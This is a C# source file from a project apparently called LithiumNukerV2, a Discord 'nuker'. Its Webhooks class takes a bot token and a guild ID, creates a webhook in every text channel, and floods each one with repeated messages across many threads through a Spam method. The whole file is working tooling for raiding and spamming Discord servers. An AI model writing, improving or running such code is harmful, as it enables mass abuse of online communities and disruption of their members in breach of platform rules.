using System;
using System.Net;
using System.Dynamic;
using System.Text;
using System.IO;
using System.Collections.Generic;
using System.Threading;
using System.Linq;
using System.Drawing;

using LithiumNukerV2;
using Newtonsoft.Json;
using Veylib.CLIUI;

namespace LithiumCore
{
    public partial class Webhooks
    {
        public delegate void noret();
        public static event noret Finished;

        private string token;
        private long guildId;
        private int threads;
        public Webhooks(string tok, long gid, int threadCount)
        {
            token = tok;
            guildId = gid;
            threads = threadCount;
        }

        public Core core = Core.GetInstance();

        public class Webhook
        {
            public Webhook(dynamic raw)
            {
                if (raw.code != null && (int)raw.code == 20029)
                    throw new Exception((string)raw.message);
                else if (raw.message != null && (string)raw.message == "Unknown Channel")
                    throw new Exception("Bad channel");

                ChannelId = raw.channel_id;
                Url = $"https://discord.com/api/webhooks/{raw.id}/{raw.token}";
                Name = raw.name;

                _raw = raw;
            }

            public string Url;
            public string Name;
            public long ChannelId;
            public dynamic _raw;
        }

        public string Name;
        public string Content;
        
        public List<Webhook> GetAll(List<Channels.Channel> channels = null)
        {
            var whs = new List<Webhook>();

            if (channels == null)
                channels = new Channels(token, guildId, threads).GetAll();

            foreach (var chan in channels)
                foreach (var whsChan in chan.GetWebhooks(token))
                    whs.Add(whsChan);

            return whs;
        }


        public Webhook Create(string token, string whName, long channelId)
        {
            // Basic req shit
            var req = WebRequest.Create($"https://discord.com/api/v9/channels/{channelId}/webhooks");
            req.Method = "POST";
            req.ContentType = "application/json";
            req.Headers.Add("Authorization", $"Bot {token}");

            // Create json as a dynamic
            dynamic jsonBody = new ExpandoObject();
            jsonBody.name = whName;

            // Write body
            byte[] body = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(jsonBody));
            req.GetRequestStream().Write(body, 0, body.Length);

            // Response vars
            string raw = null;
            dynamic json = null;

            // Get response
            try
            {
                raw = new StreamReader(req.GetResponse().GetResponseStream()).ReadToEnd();
            }
            catch (WebException ex)
            {
                raw = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
            }

            json = JsonConvert.DeserializeObject(raw);

            try
            {
                var wh = new Webhook(json);
                core.WriteLine(Color.Lime, $"Created webhook {whName} in {channelId}");
                return wh;
            } catch (Exception ex)
            {
                core.WriteLine(Color.Red, $"Failed to create webhook: {ex.Message}");
            }

            return null;
        }

        public void SendLoop(string token, string avUrl, List<Webhook> webhooks, int amount)
        {
            for (var x =0;x < amount;x++)
            {
                foreach (var wh in webhooks)
                {
                    Send(token, avUrl, wh.Url);
                }
            }
        }

        public void Send(string token, string avUrl, string whUrl)
        {
            var req = WebRequest.Create(whUrl);
            req.Method = "POST";
            req.ContentType = "application/json";
            req.Headers.Add("Authorization", $"Bot {token}");
            req.Proxy = null;

            dynamic jsonBody = new ExpandoObject();
            jsonBody.username = Name;
            jsonBody.content = Content;
            jsonBody.avatar_url = avUrl;

            byte[] body = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(jsonBody));
            req.GetRequestStream().Write(body, 0, body.Length);

            string raw;
            dynamic json;

            try
            {
                raw = new StreamReader(req.GetResponse().GetResponseStream()).ReadToEnd();
                json = JsonConvert.DeserializeObject(raw);
            } catch (WebException ex)
            {
                raw = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                json = JsonConvert.DeserializeObject(raw);
            }

            System.Diagnostics.Debug.WriteLine("Sent request");
            System.Diagnostics.Debug.WriteLine(raw);
        }

        public void Spam(string whName, string avUrl, string content, int amountEach, bool checkForExisting)
        {
            var channels = new Channels(token, guildId, threads).GetAll();
            var webhooks = new List<Webhook>();

            Content = content;

            if (checkForExisting)
            {
                var preWhs = GetAll();
                foreach (var prewh in preWhs)
                {
                    if (prewh.Name == whName)
                    {
                        webhooks.Add(prewh);
                        channels.RemoveAll(chan => chan.Id == prewh.ChannelId);
                        core.WriteLine($"Found pre-existing webhook in ", Color.White, prewh.ChannelId.ToString(), null, ", reusing.");
                    }
                }
            }

            // Create a webhook for each channel

            var loads = WorkController.Seperate(channels, threads);

            int loadsfin = 0;
            foreach (var load in loads)
            {
                new Thread(() =>
                {
                    foreach (Channels.Channel chan in load)
                    {
                        try
                        {
                            if (chan.Type == Channels.Type.Text && webhooks.FindAll(wh => wh.ChannelId == chan.Id).Count == 0)
                            {
                                var wh = Create(token, whName, chan.Id);
                                if (wh != null)
                                    webhooks.Add(wh);
                            }
                        } catch { }
                    }

                    lock (loadsfin.GetType())
                        loadsfin++;
                }).Start();
            }

            while (loadsfin < loads.Count)
                Thread.Sleep(50);

            // Create work loads
            var whloads = WorkController.Seperate(webhooks, threads);
            int finished = 0;

            // Create threads and run
            foreach (var load in whloads)
                new Thread(() => { SendLoop(token, avUrl, load, amountEach); finished++; }).Start();

            // Wait until fully finished
            while (finished < loads.Count)
                Thread.Sleep(20);

            // Invoke finished event
            Finished?.Invoke();
        }
    }
}